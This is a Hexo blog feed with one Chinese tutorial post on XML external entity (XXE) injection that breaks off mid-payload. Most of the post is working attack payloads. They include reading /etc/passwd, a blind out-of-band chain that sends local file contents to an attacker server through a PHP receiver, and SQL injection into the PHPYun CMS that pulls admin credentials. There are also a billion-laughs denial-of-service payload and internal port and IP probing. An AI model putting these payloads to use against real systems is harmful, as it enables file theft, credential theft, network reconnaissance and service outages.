<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://y-y-k.tk/"/>
  <updated>2020-03-14T12:53:44.769Z</updated>
  <id>http://y-y-k.tk/</id>
  
  <author>
    <name>YYK</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>xml注入</title>
    <link href="http://y-y-k.tk/2020/03/14/xml%E6%B3%A8%E5%85%A5/"/>
    <id>http://y-y-k.tk/2020/03/14/xml%E6%B3%A8%E5%85%A5/</id>
    <published>2020-03-14T12:26:50.629Z</published>
    <updated>2020-03-14T12:53:44.769Z</updated>
    
    <content type="html"><![CDATA[<p>首先，我们需要对<a href="https://www.runoob.com/xml/xml-tutorial.html" target="_blank" rel="noopener">XML</a>进行一定的了解，在这里不做过多的多余叙述，接下图为XML工作流程：<br><img src="https://img-blog.csdnimg.cn/20200210154120319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="简易xml概括"><a href="#简易xml概括" class="headerlink" title="简易xml概括"></a>简易xml概括</h1><h2 id="实体引用"><a href="#实体引用" class="headerlink" title="实体引用"></a>实体引用</h2><p>对于实体ENTITY，XML定义了两种类型的实体，一种在XML文档中使用，另一种作为参数在DTD中使用。语法如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 名字 [&lt;!ENTITY 实体名 <span class="string">"实体内容"</span>]&gt;</span><br></pre></td></tr></table></figure><p>楼下为预定义的实体引用<br><img src="https://img-blog.csdnimg.cn/20200210154419572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="DTD-文档类型定义"><a href="#DTD-文档类型定义" class="headerlink" title="DTD(文档类型定义)"></a>DTD(文档类型定义)</h2><h3 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h3><p>其可定义XML文档的合法构建模块，可在XML文档内声明，也可外部引用。</p><h3 id="构建方式："><a href="#构建方式：" class="headerlink" title="构建方式："></a>构建方式：</h3><p>先来说下CDATA，指由XML解析器进行解析的文本数据（未分析的字符数据）。在XML中，＜，＆字符为非法，避免麻烦例如JS代码，就将脚本代码定为CDATA ，其中的内容都会被解析器忽略，组成结构为：<code>&quot; &lt;![CDATA [&quot; ****&quot;]]&gt;&quot;</code>。其次就是普通声明及引用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name <span class="string">"entity-value"</span>&gt;</span><br></pre></td></tr></table></figure><p>引用：<br><code>&lt;message&gt;＆entity-name; &lt;/ message&gt;</code>，即可将“ entity-value”展示出来</p><h4 id="1-内部实体声明"><a href="#1-内部实体声明" class="headerlink" title="1.内部实体声明"></a>1.内部实体声明</h4><p>内部实体指在一个实体中定义的另一个实体,可用单双引号来区分内外部。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eg:&lt;!ENTITY % in <span class="string">"&lt;!ENTITY web 'http://vps'&gt;"</span>&gt;  </span><br><span class="line">%in;</span><br></pre></td></tr></table></figure><h4 id="2-外部实体声明及默认协议"><a href="#2-外部实体声明及默认协议" class="headerlink" title="2.外部实体声明及默认协议"></a>2.外部实体声明及默认协议</h4><p><img src="https://img-blog.csdnimg.cn/20200210155742589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eg: <span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ENTITY flag SYSTEM <span class="string">"file:///etc/passwd"</span>&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;a&gt;&amp;flag;&lt;/a&gt;</span><br></pre></td></tr></table></figure><h4 id="3-参数实体"><a href="#3-参数实体" class="headerlink" title="3.参数实体"></a>3.参数实体</h4><p>参数实体仅用于DTD和文档的内部子集中，XML的规范定义中，仅在DTD中才能引用参数实体。并且参数实体的引用在DTD中是该类型的实体使用“百分比”字符（或十六进制）编码的百分比）声明，并且仅在经过解析和验证后才用于替换DTD中的文本或其他内容，其在DTD中的解析优先于XML文本中的内部实体解析。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eg: <span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">&lt;!ENTITY % one <span class="string">"hello"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">%one;</span><br></pre></td></tr></table></figure><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="原理-以PHPYun-cms为例"><a href="#原理-以PHPYun-cms为例" class="headerlink" title="原理(以PHPYun cms为例)"></a>原理(以PHPYun cms为例)</h3><p>这里的漏洞位置为此cms的<code>weixin/model/index.class.php</code>,如下所示:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">responseMsg</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">    $postStr = $GLOBALS[<span class="string">"HTTP_RAW_POST_DATA"</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($postStr))&#123;</span><br><span class="line"></span><br><span class="line">                 $postObj = simplexml_load_string($postStr, <span class="string">'SimpleXMLElement'</span>, LIBXML_NOCDATA);</span><br><span class="line">                  $fromUsername = $postObj-&gt;FromUserName;</span><br><span class="line">                  $toUsername = $postObj-&gt;ToUserName;</span><br><span class="line">                  $keyword = trim($postObj-&gt;Content);</span><br><span class="line">                  $time = time();</span><br><span class="line">                  $textTpl = <span class="string">"&lt;xml&gt;</span></span><br><span class="line"><span class="string">         &lt;![CDATA[%s]]&gt;</span></span><br><span class="line"><span class="string">         &lt;![CDATA[%s]]&gt;</span></span><br><span class="line"><span class="string">         %s</span></span><br><span class="line"><span class="string">         &lt;![CDATA[%s]]&gt;</span></span><br><span class="line"><span class="string">         &lt;![CDATA[%s]]&gt;</span></span><br><span class="line"><span class="string">         0</span></span><br><span class="line"><span class="string">         &lt;/xml&gt;"</span>;</span><br><span class="line">      <span class="keyword">if</span>(!<span class="keyword">empty</span>( $keyword ))</span><br><span class="line">                  &#123;</span><br><span class="line">                  $msgType = <span class="string">"text"</span>;</span><br><span class="line">                   $contentStr = <span class="string">"Welcome to wechat world!"</span>;</span><br><span class="line">                   $resultStr = sprintf($textTpl, $fromUsername, $toUsername, $time, $msgType, $contentStr);</span><br><span class="line">                   <span class="keyword">echo</span> $resultStr;</span><br><span class="line">                  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                   <span class="keyword">echo</span> <span class="string">"Input something..."</span>;</span><br><span class="line">                  &#125;</span><br><span class="line"></span><br><span class="line">          &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">""</span>;</span><br><span class="line">           <span class="keyword">exit</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>我们可以看到<code>$postStr = $GLOBALS[&quot;HTTP_RAW_POST_DATA&quot;]</code>,这句话的意思是传递原生的语句,而后<code>$postObj = simplexml_load_string($postStr, &#39;SimpleXMLElement&#39;, LIBXML_NOCDATA);</code>又通过simplexml_load_string函数解析后,直接传入<code>$textTpl</code>.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$resultStr = sprintf($textTpl, $fromUsername, $toUsername, $time, $msgType, $contentStr);</span><br></pre></td></tr></table></figure><p>这里也相当于直接获取post过来的XML内容直接输出.(请记住这一部分,我们将会在下一部分XXE与SQL注入继续审计)</p><h3 id="外部实体注入"><a href="#外部实体注入" class="headerlink" title="外部实体注入"></a>外部实体注入</h3><p><img src="https://img-blog.csdnimg.cn/20200209214349905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt="https://m.hundan.org/wooyun-2015-0148793"></p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">"file:///etc/passwd"</span>&gt;]&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br></pre></td></tr></table></figure><h3 id="基于盲注的XXE"><a href="#基于盲注的XXE" class="headerlink" title="基于盲注的XXE"></a>基于盲注的XXE</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>当我们在无回显和无报错的基础上使用盲注，即来构建一条带外信道（OOB）获得数据，主要使用DTD中的内部实体及参数实体。</p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>注入xml文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY % host SYSTEM <span class="string">"file:///D:/flag.txt"</span>&gt;</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM <span class="string">"http://xxx/xxx.xml"</span>&gt;</span><br><span class="line">    %remote;</span><br><span class="line">    %receive;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>xxx.xml文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % receive <span class="string">"&lt;!ENTITY send SYSTEM 'http://xxx/x.php?host=%host;'&gt;"</span>&gt;</span><br></pre></td></tr></table></figure><p>x.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">file_put_contents(<span class="string">"1.txt"</span>, $_GET[<span class="string">'host'</span>]) ;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过以上代码就可以进行读取文件等常规操作了，以上说的是php环境，再说下java环境：可通过gopher，file和jar等协议进行配合nc，ftp协议，<br>这里找到<a href="https://hawkinsecurity.com/2018/03/24/gaining-filesystem-access-via-blind-oob-xxe/" target="_blank" rel="noopener">一个赏金猎人写的文章</a>，可以一看</p><h4 id="验证漏洞"><a href="#验证漏洞" class="headerlink" title="验证漏洞"></a>验证漏洞</h4><p>其实只要让网站对我们的服务器发一个http请求，然后看是否服务器接收到请求即可。代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM <span class="string">"http://vps"</span>&gt;</span><br><span class="line">%remote;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><h3 id="基于报错的XXE"><a href="#基于报错的XXE" class="headerlink" title="基于报错的XXE"></a>基于报错的XXE</h3><p>和sql注入中的报错注入差不多的原理，当我们将payload故意写错，例如在第二行出错，那xml的内容就会出现在下一行。<br>下图为示例<br><img src="https://img-blog.csdnimg.cn/20200210174428719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="XML配置文件未授权访问"><a href="#XML配置文件未授权访问" class="headerlink" title="XML配置文件未授权访问"></a>XML配置文件未授权访问</h3><p>多见于用户名,密码,apache,ldap数据库等配置信息泄露<br>更多示例可查看以下链接:<br><a href="https://m.hundan.org/wooyun-2015-0123762" target="_blank" rel="noopener">https://m.hundan.org/wooyun-2015-0123762</a>;<br><a href="https://m.hundan.org/wooyun-2015-0123588" target="_blank" rel="noopener">https://m.hundan.org/wooyun-2015-0123588</a>;<br><a href="https://m.hundan.org/wooyun-2016-0207791(19护网顺手挖到了一个同款漏洞呵呵)" target="_blank" rel="noopener">https://m.hundan.org/wooyun-2016-0207791(19护网顺手挖到了一个同款漏洞呵呵)</a></p><h2 id="XXE与SQL注入"><a href="#XXE与SQL注入" class="headerlink" title="XXE与SQL注入"></a>XXE与SQL注入</h2><h3 id="原理-PHPYun-cms为例"><a href="#原理-PHPYun-cms为例" class="headerlink" title="原理(PHPYun cms为例)"></a>原理(PHPYun cms为例)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($MsgType==<span class="string">'event'</span>)</span><br><span class="line">       &#123;</span><br><span class="line">      $MsgEvent = $postObj-&gt;Event;</span><br><span class="line">      <span class="keyword">if</span> ($MsgEvent==<span class="string">'subscribe'</span>)</span><br><span class="line">      &#123;</span><br><span class="line">       $centerStr = <span class="string">"&lt;![CDATA[欢迎您关注"</span>.iconv(<span class="string">'gbk'</span>,<span class="string">'utf-8'</span>,<span class="keyword">$this</span>-&gt;config[<span class="string">'sy_webname'</span>]).<span class="string">"！/n 1：您可以直接回复关键字如【销售】、【南京 销售】、【南京 销售 XX公司】查找您想要的职位/n绑定您的账户体验更多精彩功能/n感谢您的关注！]]&gt;"</span>;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;MsgType = <span class="string">'text'</span>;</span><br><span class="line"></span><br><span class="line">      &#125;<span class="keyword">elseif</span> ($MsgEvent==<span class="string">'CLICK'</span>)</span><br><span class="line">      &#123;</span><br><span class="line">       $EventKey = $postObj-&gt;EventKey;</span><br><span class="line">       <span class="keyword">if</span>($EventKey==<span class="string">'我的帐号'</span>)&#123;</span><br><span class="line">        $centerStr = <span class="keyword">$this</span>-&gt;bindUser($fromUsername);</span><br><span class="line"></span><br><span class="line">       &#125;<span class="keyword">elseif</span>($EventKey==<span class="string">'我的消息'</span>)</span><br><span class="line">       &#123;</span><br><span class="line">        $centerStr = <span class="keyword">$this</span>-&gt;myMsg($fromUsername);</span><br><span class="line">       &#125;<span class="keyword">elseif</span>($EventKey==<span class="string">'面试邀请'</span>)</span><br><span class="line">       &#123;</span><br><span class="line">        $centerStr = <span class="keyword">$this</span>-&gt;Audition($fromUsername);</span><br><span class="line"></span><br><span class="line">       &#125;<span class="keyword">elseif</span>($EventKey==<span class="string">'简历查看'</span>)</span><br><span class="line">       &#123;</span><br><span class="line"></span><br><span class="line">        $centerStr = <span class="keyword">$this</span>-&gt;lookResume($fromUsername);</span><br><span class="line"></span><br><span class="line">       &#125;<span class="keyword">elseif</span>($EventKey==<span class="string">'刷新简历'</span>)</span><br><span class="line">       &#123;</span><br><span class="line"></span><br><span class="line">        $centerStr = <span class="keyword">$this</span>- &gt; refResume （$ fromUsername ）;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">isBind</span><span class="params">($wxid=<span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($wxid)</span><br><span class="line">&#123;</span><br><span class="line">$User = <span class="keyword">$this</span>-&gt;obj-&gt;DB_select_once(<span class="string">"member"</span>,<span class="string">"`wxid`='"</span>.$wxid.<span class="string">"'"</span>,<span class="string">"`uid`,`username`"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($User[<span class="string">'uid'</span>]&gt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">$User[<span class="string">'bindtype'</span>] = <span class="string">'1'</span>;</span><br><span class="line">$User[<span class="string">'cenetrTpl'</span>] = <span class="string">"&lt;Content&gt;&lt;![CDATA[您的"</span>.iconv(<span class="string">'gbk'</span>,<span class="string">'utf-8'</span>,<span class="keyword">$this</span>-&gt;config[<span class="string">'sy_webname'</span>]).<span class="string">"帐号："</span>.$User[<span class="string">'username'</span>].<span class="string">"已成功绑定！ \n\n\n 您也可以&lt;a href=\""</span>.<span class="keyword">$this</span>-&gt;config[<span class="string">'sy_weburl'</span>].<span class="string">"/wap/index.php?m=login&amp;wxid="</span>.$wxid.<span class="string">"\"&gt;点击这里&lt;/a&gt;进行解绑或绑定其他帐号]]&gt;&lt;/Content&gt;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$Token = <span class="keyword">$this</span>-&gt;getToken();</span><br><span class="line">$Url = <span class="string">'https://api.weixin.qq.com/cgi-bin/user/info?access_token='</span>.$Token.<span class="string">'&amp;openid='</span>.$wxid.<span class="string">'&amp;lang=zh_CN'</span>;</span><br><span class="line">$CurlReturn  = <span class="keyword">$this</span>-&gt;CurlPost($Url);</span><br><span class="line">$UserInfo    = json_decode($CurlReturn);</span><br><span class="line"></span><br><span class="line">$wxid        = $wxid;</span><br><span class="line">$wxname      = $UserInfo-&gt;nickname;</span><br><span class="line"><span class="keyword">$this</span>-&gt;config[<span class="string">'token_time'</span>] = time();</span><br><span class="line">$User[<span class="string">'cenetrTpl'</span>] = <span class="string">'&lt;Content&gt;&lt;![CDATA[您还没有绑定帐号，&lt;a href="'</span>.<span class="keyword">$this</span>-&gt;config[<span class="string">'sy_weburl'</span>].<span class="string">'/wap/index.php?m=login&amp;wxid='</span>.$wxid.<span class="string">'"&gt;点击这里&lt;/a&gt;进行绑定!]]&gt;&lt;/Content&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $User;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到第一段代码满足后，会进入第二段代码的isBind函数，这里<code>$wxid</code>是我们传入的<code>FromUserName</code>的值，我们在上面XXE原理进行过代码审计知道它不会对我们传入的数据进行过滤，由此可进行SQL注入<br>payload:<br><code>&lt;FromUserName&gt;1111&#39; and 1=2 union select 1,(select concat(username,0x23,password) from phpyun_admin_user limit 0,1)#&lt;/FromUserName&gt;</code>  需要注意的是一定要修改HTTP请求为Content-Type: text/ xml; </p><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p> 为避免重复造轮，可自行查看<a href="https://m.hundan.org/wooyun-2015-0122523" target="_blank" rel="noopener">火遍各大高校的某方教务，可拖数据库</a></p><h2 id="XXE与XSS攻击"><a href="#XXE与XSS攻击" class="headerlink" title="XXE与XSS攻击"></a>XXE与XSS攻击</h2><p> 这篇文章写的很不错，可以借鉴一下<br> <a href="https://paper.seebug.org/80/" target="_blank" rel="noopener">使用XML内部实体绕过Chrome和IE的XSS过滤器</a></p><h2 id="XXE与DDOS攻击"><a href="#XXE与DDOS攻击" class="headerlink" title="XXE与DDOS攻击"></a>XXE与DDOS攻击</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p> 一般分为两种：</p><ul><li>1.请求大的文件(eg:C:/pagefile.sys 或/dev/random)<br>/dev/random处于unix中，用作伪随机数生成<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY go <span class="string">"file:///dev/random"</span> &gt;]&gt;&lt;msg&gt;&amp;go;&lt;/msg&gt;</span><br></pre></td></tr></table></figure></li></ul><ul><li>2.billion laughs攻击，即通过不断递归调用来使解析器繁忙，占用内存最终崩掉。（可配合LOIC工具，食用更佳）</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--此代码包含<span class="number">10</span>亿个大文件，约占<span class="number">3000</span>M字节内存--&gt;</span><br><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">&lt;!ENTITY lol <span class="string">"lol"</span>&gt;</span><br><span class="line">&lt;!ELEMENT lolz (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line">&lt;!ENTITY lol1 <span class="string">"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol</span></span><br><span class="line"><span class="string">;&amp;lol;"</span>&gt;</span><br><span class="line">&lt;!ENTITY lol2 <span class="string">"&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;</span></span><br><span class="line"><span class="string">lol1;&amp;lol1;&amp;lol1;"</span>&gt;</span><br><span class="line">&lt;!ENTITY lol3 <span class="string">"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;</span></span><br><span class="line"><span class="string">lol2;&amp;lol2;&amp;lol2;"</span>&gt;</span><br><span class="line">&lt;!ENTITY lol4 <span class="string">"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;</span></span><br><span class="line"><span class="string">lol3;&amp;lol3;&amp;lol3;"</span>&gt;</span><br><span class="line">&lt;!ENTITY lol5 <span class="string">"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;</span></span><br><span class="line"><span class="string">lol4;&amp;lol4;&amp;lol4;"</span>&gt;</span><br><span class="line">&lt;!ENTITY lol6 <span class="string">"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;</span></span><br><span class="line"><span class="string">lol5;&amp;lol5;&amp;lol5;"</span>&gt;</span><br><span class="line">&lt;!ENTITY lol7 <span class="string">"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;</span></span><br><span class="line"><span class="string">lol6;&amp;lol6;&amp;lol6;"</span>&gt;</span><br><span class="line">&lt;!ENTITY lol8 <span class="string">"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;</span></span><br><span class="line"><span class="string">lol7;&amp;lol7;&amp;lol7;"</span>&gt;</span><br><span class="line">&lt;!ENTITY lol9 <span class="string">"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;</span></span><br><span class="line"><span class="string">lol8;&amp;lol8;&amp;lol8;"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure><h3 id="案例-1"><a href="#案例-1" class="headerlink" title="案例"></a>案例</h3><p> <a href="https://m.hundan.org/wooyun-2015-0137143" target="_blank" rel="noopener">https://m.hundan.org/wooyun-2015-0137143</a> </p><h2 id="XXE与内网信息，命令执行"><a href="#XXE与内网信息，命令执行" class="headerlink" title="XXE与内网信息，命令执行"></a>XXE与内网信息，命令执行</h2><p> 这里就不进行原理阐述了，和解释器有一些关系，直接上干货，以下建议配合脚本食用更佳。</p><ul><li>探测端口<br>如果失败则可能返回<code>Connection refused</code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">"http://192.168.0.1:3306"</span>&gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure></li><li>探测内网IP</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">"http://otherIP"</span>&gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><ul><li><p>在安装有expect扩展的php环境执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span 